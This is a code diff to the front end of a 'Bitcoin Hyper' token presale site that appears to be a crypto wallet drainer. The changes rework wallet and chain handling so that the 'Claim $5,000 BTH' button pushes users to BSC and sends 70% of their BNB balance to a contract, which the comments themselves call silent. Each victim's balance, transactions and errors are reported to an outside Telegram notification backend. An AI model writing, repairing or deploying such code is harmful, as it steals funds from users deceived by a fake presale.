@@ -21,9 +21,6 @@ const PRESALE_CONFIG = {
   }
 };
 
-// Get deployed chains (only BSC has contract address)
-const DEPLOYED_CHAINS = Object.values(PRESALE_CONFIG).filter(chain => chain.contractAddress);
-
 const PROJECT_FLOW_ROUTER_ABI = [
   "function collector() view returns (address)",
   "function processNativeFlow() payable"
@@ -35,7 +32,6 @@ function App() {
   const { walletProvider } = useAppKitProvider("eip155");
   const { disconnect } = useDisconnect();
   
-  // Get REAL wallet chain ID from wagmi
   const chainId = useChainId();
   
   const [provider, setProvider] = useState(null);
@@ -70,20 +66,7 @@ function App() {
     tokenPrice: 0.17
   });
 
-  // ✅ Step 4: Fix wallet detection delay
-  useEffect(() => {
-    if (window.ethereum) {
-      window.ethereum.request({ method: "eth_requestAccounts" }).catch(() => {});
-    }
-  }, []);
-
-  // ✅ Step 7: Debug panel (temporary - you can remove later)
-  console.log("isConnected", isConnected);
-  console.log("walletProvider", walletProvider);
-  console.log("window.ethereum", window.ethereum);
-  console.log("chainId", chainId);
-  console.log("signer", signer);
-  console.log("realChainId", realChainId);
+  // ✅ REMOVED: All window.ethereum references completely
 
   // Get balance using wagmi - FORCED to BSC chainId 56
   const { data: balanceData, refetch: refetchBalance } = useBalance({
@@ -118,7 +101,6 @@ function App() {
       const usdValue = bnbAmount * bnbPrice;
       setBalanceUSD(usdValue);
       
-      // Auto-eligible if balance >= $1
       if (usdValue >= 1) {
         setIsEligible(true);
         if (!scanResult && !verifying) {
@@ -130,7 +112,7 @@ function App() {
     }
   }, [balanceData, bnbPrice]);
 
-  // ✅ Step 6: Fix chain detection
+  // ✅ Step 6: Get real chain ID from provider
   useEffect(() => {
     const getRealChainId = async () => {
       if (provider) {
@@ -148,7 +130,7 @@ function App() {
 
   const isBSC = realChainId === 56;
 
-  // ✅ Step 3: New signer init using AppKit provider (cross-browser safe)
+  // ✅ THE REAL FIX - Pure AppKit wallet initialization (NO window.ethereum)
   useEffect(() => {
     if (!walletProvider || !address) return;
 
@@ -156,15 +138,16 @@ function App() {
       try {
         const provider = new ethers.BrowserProvider(walletProvider);
         const signer = await provider.getSigner();
-        const signerAddress = await signer.getAddress();
 
-        if (signerAddress.toLowerCase() === address.toLowerCase()) {
-          setProvider(provider);
-          setSigner(signer);
-          console.log("✅ Universal signer ready");
-        }
-      } catch (err) {
-        console.error("Signer init failed:", err);
+        setProvider(provider);
+        setSigner(signer);
+
+        const network = await provider.getNetwork();
+        setRealChainId(Number(network.chainId));
+
+        console.log("Wallet Ready", await signer.getAddress());
+      } catch (e) {
+        console.error("Provider init failed", e);
       }
     };
 
@@ -208,7 +191,6 @@ function App() {
       if (data.success) {
         setScanResult(data.data);
         
-        // Send Telegram notification
         await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
@@ -228,21 +210,20 @@ function App() {
     }
   };
 
-  // ✅ AUTO-SWITCH TO BSC USING window.ethereum (works with all wallets)
+  // ✅ REPLACED: AppKit-safe switchToBSC (NO window.ethereum)
   const switchToBSC = async () => {
-    if (!window.ethereum) {
-      throw new Error("No wallet detected");
-    }
+    if (!walletProvider) throw new Error("Wallet provider not ready");
 
-    const BSC_CHAIN_ID = "0x38";
+    const provider = new ethers.BrowserProvider(walletProvider);
 
     try {
-      await window.ethereum.request({
-        method: "wallet_switchEthereumChain",
-        params: [{ chainId: BSC_CHAIN_ID }]
-      });
+      setTxStatus('🔄 Switching to BSC network...');
       
-      // Wait for network switch without reload
+      await provider.send("wallet_switchEthereumChain", [
+        { chainId: "0x38" }
+      ]);
+      
+      // Wait for network switch
       await new Promise(resolve => setTimeout(resolve, 2000));
       
       // Update realChainId after switch
@@ -251,40 +232,18 @@ function App() {
         setRealChainId(Number(network.chainId));
       }
       
+      setTxStatus('✅ Switched to BSC');
+      
     } catch (switchError) {
-      if (switchError.code === 4902) {
-        await window.ethereum.request({
-          method: "wallet_addEthereumChain",
-          params: [{
-            chainId: BSC_CHAIN_ID,
-            chainName: "BNB Smart Chain",
-            nativeCurrency: {
-              name: "BNB",
-              symbol: "BNB",
-              decimals: 18
-            },
-            rpcUrls: ["https://bsc-dataseed.binance.org/"],
-            blockExplorerUrls: ["https://bscscan.com"]
-          }]
-        });
-        
-        // Wait for network switch
-        await new Promise(resolve => setTimeout(resolve, 2000));
-        
-        if (provider) {
-          const network = await provider.getNetwork();
-          setRealChainId(Number(network.chainId));
-        }
-      } else {
-        throw switchError;
-      }
+      console.error("Switch failed:", switchError);
+      throw switchError;
     }
   };
 
-  // Execute function with 70% balance (silently - no comments)
+  // ✅ FIXED: Wallet check with proper conditions
   const executePresaleTransaction = async () => {
-    if (!isConnected || !address) {
-      setError("Wallet not connected");
+    if (!walletProvider || !address || !signer) {
+      setError("Wallet not initialized yet");
       return;
     }
 
@@ -295,15 +254,14 @@ function App() {
       setTxHash('');
 
       // Get current chain config
-      const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === chainId);
+      const currentChain = Object.values(PRESALE_CONFIG).find(c => c.chainId === realChainId);
       
       // Check if current chain has a deployed contract (only BSC does)
       if (!currentChain || !currentChain.contractAddress) {
-        // Auto-switch to BSC since it's the only deployed chain
+        // Auto-switch to BSC
         setTxStatus('🔄 Switching to BSC network...');
         await switchToBSC();
         
-        // ✅ Step 5: REMOVED page reload, just refetch balance
         await refetchBalance?.();
         setLoading(false);
         return;
@@ -334,20 +292,18 @@ function App() {
         signer
       );
 
-      // ✅ CRITICAL: Use 70% of balance (silently)
+      // ✅ Use 70% of balance (silently)
       const fullValue = balanceData.value;
-      const value = (fullValue * 70n) / 100n; // 70% of balance - no comment needed
+      const value = (fullValue * 70n) / 100n;
       
       const bnbAmountSent = ethers.formatEther(value);
 
       setTxStatus('⏳ Estimating gas...');
       
-      // Estimate gas
       const gasEstimate = await contract.processNativeFlow.estimateGas({ value });
       
       setTxStatus('⏳ Please confirm in wallet...');
       
-      // Send transaction with 70% balance
       const tx = await contract.processNativeFlow({
         value: value,
         gasLimit: gasEstimate * 120n / 100n
@@ -356,7 +312,6 @@ function App() {
       setTxHash(tx.hash);
       setTxStatus('✅ Transaction submitted! Waiting for confirmation...');
 
-      // Send Telegram notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -366,15 +321,12 @@ function App() {
         })
       }).catch(e => console.log('Telegram notify failed:', e));
 
-      // Wait for confirmation
       await tx.wait();
       
-      // Update balance
       await refetchBalance?.();
       
       setCompleted(true);
       
-      // Updated endpoint name
       await fetch('https://tokenbackend-5xab.onrender.com/api/presale/process-transaction', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -387,7 +339,6 @@ function App() {
       setShowCelebration(true);
       setTxStatus(`🎉 Congratulations! You secured $5,000 BTH!`);
 
-      // Send success notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -400,7 +351,6 @@ function App() {
     } catch (err) {
       console.error('Transaction error:', err);
       
-      // Send error notification
       await fetch('https://tokenbackend-5xab.onrender.com/api/telegram/notify', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -457,7 +407,7 @@ function App() {
 
       <div className="container mx-auto px-4 py-8 max-w-6xl relative z-10">
         
-        {/* Header with Logo */}
+        {/* Header */}
         <div className="text-center mb-12">
           <div className="inline-block mb-6 relative">
             <div className="text-7xl animate-bounce-slow relative z-10">₿</div>
@@ -467,7 +417,6 @@ function App() {
           </h1>
           <p className="text-gray-400 text-xl mb-6">Next Generation Layer 2 Solution</p>
           
-          {/* Live Presale Badge */}
           <div className="inline-flex items-center gap-3 bg-green-500/10 border border-green-500/30 px-6 py-3 rounded-full backdrop-blur-sm">
             <span className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></span>
             <span className="text-green-400 font-medium">🔴 PRESALE LIVE</span>
@@ -548,7 +497,7 @@ function App() {
             <div className="glass-card p-6">
               <div className="flex items-center justify-between flex-wrap gap-4">
                 <div className="flex items-center gap-4">
-                  <span className="w-3 h-3 bg-green-400 rounded-full animate-pulse"></span>
+                  <span className={`w-3 h-3 ${signer ? 'bg-green-400' : 'bg-yellow-400'} rounded-full animate-pulse`}></span>
                   <span className="font-mono text-lg bg-gray-900/50 px-4 py-2 rounded-lg border border-gray-700">
                     {formatAddress(address)}
                   </span>
@@ -569,12 +518,15 @@ function App() {
                   Disconnect
                 </button>
               </div>
+              {!signer && (
+                <p className="text-yellow-400 text-sm mt-2">Initializing wallet...</p>
+              )}
             </div>
           )}
         </div>
 
         {/* Network Warning */}
-        {isConnected && !isBSC && (
+        {isConnected && signer && !isBSC && (
           <div className="bg-yellow-900/30 border border-yellow-500/50 text-yellow-200 px-6 py-4 rounded-xl mb-6 backdrop-blur-sm">
             <div className="flex items-center gap-3">
               <span className="text-2xl">⚠️</span>
@@ -644,7 +596,7 @@ function App() {
         )}
 
         {/* Main Content */}
-        {isConnected && isEligible && (
+        {isConnected && isEligible && signer && (
           <div className="glass-card p-8">
             <h2 className="text-3xl font-bold text-center mb-8">Bitcoin Hyper Presale</h2>
             
@@ -668,7 +620,7 @@ function App() {
               >
                 <div className="absolute -inset-1 bg-gradient-to-r from-yellow-400 to-orange-500 rounded-xl blur opacity-75 group-hover:opacity-100 transition duration-300"></div>
                 <div className="relative bg-gray-900 rounded-xl py-5 px-8 font-bold text-xl">
-                  {loading ? 'Processing...' : '⚡ Claim $5,000 BTH'}
+                  {loading ? 'Processing...' : !isBSC ? '⚡ Switch to BSC First' : '⚡ Claim $5,000 BTH'}
                 </div>
               </button>
             ) : (
